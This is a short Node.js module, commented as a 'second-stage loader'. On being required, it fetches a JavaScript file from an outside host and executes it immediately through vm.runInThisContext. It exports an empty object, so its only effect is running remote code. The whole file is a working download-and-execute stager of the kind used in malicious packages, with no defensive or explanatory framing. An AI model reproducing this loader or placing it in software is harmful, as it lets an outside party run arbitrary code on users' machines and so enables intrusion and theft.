// Second-stage loader: fetches code and evaluates it
const https = require('https');
const vm = require('vm');
https.get('https://cdn.example-assets.net/stage2.js', (res) => {
  let body = '';
  res.on('data', (c) => (body += c));
  res.on('end', () => vm.runInThisContext(body));
});
module.exports = {};
